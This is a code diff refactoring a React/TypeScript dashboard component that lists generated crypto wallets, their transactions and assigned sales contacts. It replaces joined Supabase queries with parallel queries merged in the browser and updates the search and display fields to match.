@@ -33,78 +33,57 @@ const Transaction = () => {
   const { data: monitoringData, isLoading, refetch } = useQuery({
     queryKey: ['monitoring-data'],
     queryFn: async () => {
-      // Get all wallet data with transactions
-      const { data: walletData, error: walletError } = await supabase
-        .from('generated_wallets')
-        .select(`
-          id,
-          eth_address,
-          btc_address,
-          bsc_address,
-          created_at,
-          is_monitoring_active,
-          commercial_id,
-          wallets (
-            id,
-            wallet_phrase,
-            client_tracking_id,
-            status,
-            used_at,
-            last_balance_check,
-            client_balance,
-            used_by_commercial_id
-          ),
-          commercials (
-            id,
-            name
-          ),
-          wallet_transactions (
-            id,
-            amount,
-            amount_usd,
-            network,
-            transaction_type,
-            token_symbol,
-            transaction_hash,
-            from_address,
-            to_address,
-            timestamp,
-            created_at,
-            notification_sent,
-            price_at_time,
-            block_number
-          )
-        `)
-        .order('created_at', { ascending: false });
+      const [gwRes, txRes, walletsRes, commercialsRes] = await Promise.all([
+        supabase
+          .from('generated_wallets')
+          .select('id, eth_address, btc_address, bsc_address, created_at, is_monitoring_active, commercial_id, wallet_id')
+          .order('created_at', { ascending: false }),
+        supabase
+          .from('wallet_transactions')
+          .select('id, amount, amount_usd, network, transaction_type, token_symbol, transaction_hash, from_address, to_address, timestamp, created_at, notification_sent, price_at_time, block_number, generated_wallet_id, commercial_id')
+          .order('created_at', { ascending: false }),
+        supabase
+          .from('wallets')
+          .select('id, wallet_phrase, client_tracking_id, status, used_at, last_balance_check, client_balance, used_by_commercial_id'),
+        supabase
+          .from('commercials')
+          .select('id, name')
+      ]);
 
-      if (walletError) throw walletError;
+      if (gwRes.error) throw gwRes.error;
+      if (txRes.error) throw txRes.error;
+      if (walletsRes.error) throw walletsRes.error;
+      if (commercialsRes.error) throw commercialsRes.error;
 
-      // Get all individual transactions for the transactions view
-      const { data: allTransactions, error: transError } = await supabase
-        .from('wallet_transactions')
-        .select(`
-          *,
-          generated_wallets (
-            eth_address,
-            btc_address,
-            bsc_address,
-            wallets (
-              client_tracking_id,
-              wallet_phrase
-            ),
-            commercials (
-              name
-            )
-          )
-        `)
-        .order('created_at', { ascending: false });
+      const walletsMap = new Map((walletsRes.data || []).map((w: any) => [w.id, w]));
+      const commercialsMap = new Map((commercialsRes.data || []).map((c: any) => [c.id, c]));
+      const gwById = new Map((gwRes.data || []).map((g: any) => [g.id, g]));
 
-      if (transError) throw transError;
+      const txByGwId = new Map<string, any[]>();
+      (txRes.data || []).forEach((tx: any) => {
+        if (!tx.generated_wallet_id) return;
+        const arr = txByGwId.get(tx.generated_wallet_id) || [];
+        arr.push(tx);
+        txByGwId.set(tx.generated_wallet_id, arr);
+      });
 
-      return {
-        walletGroups: walletData || [],
-        allTransactions: allTransactions || []
-      };
+      const walletGroups = (gwRes.data || []).map((g: any) => ({
+        ...g,
+        _wallet: g.wallet_id ? walletsMap.get(g.wallet_id) : undefined,
+        _commercial: g.commercial_id ? commercialsMap.get(g.commercial_id) : undefined,
+        _transactions: txByGwId.get(g.id) || []
+      }));
+
+      const allTransactions = (txRes.data || []).map((tx: any) => {
+        const g = tx.generated_wallet_id ? gwById.get(tx.generated_wallet_id) : undefined;
+        const _wallet = g?.wallet_id ? walletsMap.get(g.wallet_id) : undefined;
+        const _commercial = tx.commercial_id
+          ? commercialsMap.get(tx.commercial_id)
+          : (g?.commercial_id ? commercialsMap.get(g.commercial_id) : undefined);
+        return { ...tx, _walletGroup: g, _wallet, _commercial };
+      });
+
+      return { walletGroups, allTransactions };
     },
     refetchInterval: autoRefresh ? 30000 : false
   });
@@ -114,15 +93,10 @@ const Transaction = () => {
     mutationFn: async (walletGroup: any) => {
       const { error } = await supabase.functions.invoke('scan-wallet-transactions', {
         body: {
-          wallet_id: walletGroup.wallets?.id,
-          addresses: {
-            eth: walletGroup.eth_address,
-            btc: walletGroup.btc_address,
-            bsc: walletGroup.bsc_address
-          }
+          wallet_addresses: [walletGroup.eth_address, walletGroup.btc_address, walletGroup.bsc_address].filter(Boolean),
+          commercial_id: walletGroup.commercial_id
         }
       });
-      
       if (error) throw error;
     },
     onSuccess: () => {
@@ -143,11 +117,15 @@ const Transaction = () => {
     
     // Search filter
     if (searchTerm) {
-      filtered = filtered.filter(tx => 
+      filtered = filtered.filter((tx: any) =>
         tx.transaction_hash?.toLowerCase().includes(searchTerm.toLowerCase()) ||
         tx.from_address?.toLowerCase().includes(searchTerm.toLowerCase()) ||
         tx.to_address?.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        tx.generated_wallets?.wallets?.client_tracking_id?.toLowerCase().includes(searchTerm.toLowerCase())
+        tx._wallet?.client_tracking_id?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+        tx._walletGroup?.eth_address?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+        tx._walletGroup?.btc_address?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+        tx._walletGroup?.bsc_address?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+        tx._commercial?.name?.toLowerCase().includes(searchTerm.toLowerCase())
       );
     }
     
@@ -174,12 +152,12 @@ const Transaction = () => {
     let filtered = monitoringData.walletGroups;
     
     if (searchTerm) {
-      filtered = filtered.filter(group => 
-        group.wallets?.client_tracking_id?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+      filtered = filtered.filter((group: any) => 
+        group._wallet?.client_tracking_id?.toLowerCase().includes(searchTerm.toLowerCase()) ||
         group.eth_address?.toLowerCase().includes(searchTerm.toLowerCase()) ||
         group.btc_address?.toLowerCase().includes(searchTerm.toLowerCase()) ||
         group.bsc_address?.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        group.commercials?.[0]?.name?.toLowerCase().includes(searchTerm.toLowerCase())
+        group._commercial?.name?.toLowerCase().includes(searchTerm.toLowerCase())
       );
     }
     
@@ -211,11 +189,12 @@ const Transaction = () => {
 
   const getWalletAddress = (transaction: any) => {
     if (transaction.to_address) return transaction.to_address;
-    if (transaction.generated_wallets) {
-      const { network } = transaction;
-      if (network === 'BSC') return transaction.generated_wallets.bsc_address;
-      if (network === 'ETH') return transaction.generated_wallets.eth_address;
-      if (network === 'BTC') return transaction.generated_wallets.btc_address;
+    const { network } = transaction;
+    const gw = transaction._walletGroup;
+    if (gw) {
+      if (network === 'BSC') return gw.bsc_address;
+      if (network === 'ETH') return gw.eth_address;
+      if (network === 'BTC') return gw.btc_address;
     }
     return 'N/A';
   };
@@ -231,7 +210,7 @@ const Transaction = () => {
   };
 
   const getWalletStatus = (group: any) => {
-    const hasRecentTransaction = group.wallet_transactions?.some((tx: any) => 
+    const hasRecentTransaction = group._transactions?.some((tx: any) => 
       new Date(tx.created_at) > new Date(Date.now() - 24 * 60 * 60 * 1000)
     );
     
@@ -408,9 +387,9 @@ const Transaction = () => {
                   <div className="space-y-4">
                     {getFilteredWalletGroups().map((group) => {
                       const walletStatus = getWalletStatus(group);
-                      const lastTransaction = group.wallet_transactions?.[0];
-                      const totalTransactions = group.wallet_transactions?.length || 0;
-                      const totalValue = group.wallet_transactions?.reduce((sum: number, tx: any) => 
+                      const lastTransaction = group._transactions?.[0];
+                      const totalTransactions = group._transactions?.length || 0;
+                      const totalValue = group._transactions?.reduce((sum: number, tx: any) => 
                         sum + (tx.amount_usd || 0), 0) || 0;
 
                       return (
@@ -420,7 +399,7 @@ const Transaction = () => {
                               <div className="flex flex-col">
                                 <div className="flex items-center gap-2">
                                   <h3 className="font-semibold">
-                                    {group.wallets?.client_tracking_id || `Wallet ${group.id.slice(0, 8)}`}
+                                    {group._wallet?.client_tracking_id || `Wallet ${group.id.slice(0, 8)}`}
                                   </h3>
                                   <Badge variant={walletStatus.color as any}>
                                     {walletStatus.status}
@@ -432,8 +411,8 @@ const Transaction = () => {
                                   )}
                                 </div>
                                 <div className="text-sm text-muted-foreground">
-                                  Commercial: {group.commercials?.[0]?.name || 'Unknown'} • 
-                                  Balance: ${group.wallets?.client_balance || '0.00'}
+                                  Commercial: {group._commercial?.name || 'Unknown'} • 
+                                  Balance: ${group._wallet?.client_balance || '0.00'}
                                 </div>
                               </div>
                             </div>
@@ -479,8 +458,8 @@ const Transaction = () => {
 
                           <div className="flex items-center justify-between pt-2 border-t">
                             <div className="text-sm text-muted-foreground">
-                              Last check: {group.wallets?.last_balance_check ? 
-                                formatTimeAgo(group.wallets.last_balance_check) : 'Never'}
+                              Last check: {group._wallet?.last_balance_check ? 
+                                formatTimeAgo(group._wallet.last_balance_check) : 'Never'}
                             </div>
                             {lastTransaction && (
                               <div className="text-sm text-muted-foreground">
@@ -491,11 +470,11 @@ const Transaction = () => {
                           </div>
 
                           {/* Recent transactions preview */}
-                          {group.wallet_transactions?.length > 0 && (
+                          {group._transactions?.length > 0 && (
                             <div className="space-y-2">
                               <h4 className="font-medium text-sm">Recent Transactions</h4>
                               <div className="space-y-1">
-                                {group.wallet_transactions.slice(0, 3).map((tx: any) => (
+                                {group._transactions.slice(0, 3).map((tx: any) => (
                                   <div key={tx.id} className="flex items-center justify-between text-sm p-2 bg-muted/30 rounded">
                                     <div className="flex items-center gap-2">
                                       <Badge variant="outline" className="text-xs">{tx.network}</Badge>
@@ -510,9 +489,9 @@ const Transaction = () => {
                                     </div>
                                   </div>
                                 ))}
-                                {group.wallet_transactions.length > 3 && (
+                                {group._transactions.length > 3 && (
                                   <div className="text-center text-sm text-muted-foreground py-1">
-                                    +{group.wallet_transactions.length - 3} more transactions
+                                    +{group._transactions.length - 3} more transactions
                                   </div>
                                 )}
                               </div>
@@ -566,10 +545,10 @@ const Transaction = () => {
                           <TableCell>
                             <div className="flex flex-col">
                               <span className="font-medium">
-                                {transaction.generated_wallets?.wallets?.client_tracking_id || 'Unknown'}
+                                {transaction._wallet?.client_tracking_id || 'Unknown'}
                               </span>
                               <span className="text-xs text-muted-foreground">
-                                {transaction.generated_wallets?.commercials?.[0]?.name || 'No commercial'}
+                                {transaction._commercial?.name || 'No commercial'}
                               </span>
                             </div>
                           </TableCell>
